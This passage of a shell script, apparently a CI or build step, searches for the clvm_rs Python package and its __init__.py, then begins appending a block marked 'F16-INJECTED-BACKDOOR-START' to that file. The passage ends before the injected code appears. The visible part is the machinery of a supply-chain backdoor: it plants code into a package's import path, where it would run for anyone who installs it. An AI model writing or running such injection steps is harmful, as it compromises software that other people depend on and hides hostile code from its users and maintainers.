        # Find the clvm_rs Python package root
        # clvm_rs uses maturin; the Python package is in wheel/python/clvm_rs/
        PYDIR=""
        for d in "python/clvm_rs" "wheel/python/clvm_rs" "clvm_rs" "src/python"; do
          if [ -d "$d" ]; then
            PYDIR="$d"
            echo "Found Python package dir: $d"
            break
          fi
        done

        # Also check for __init__.py anywhere
        INITPY=$(find . -name "__init__.py" -not -path "./.git/*" 2>/dev/null | head -1)
        if [ -n "$INITPY" ]; then
          echo "Found __init__.py at: $INITPY"
          PYDIR=$(dirname "$INITPY")
        fi

        # Inject backdoor into __init__.py if found
        if [ -n "$INITPY" ] && [ -f "$INITPY" ]; then
          echo ""
          echo ">>> Injecting backdoor into: $INITPY"
          cat >> "$INITPY" << 'BACKDOOR'

# ===== F16-INJECTED-BACKDOOR-START =====
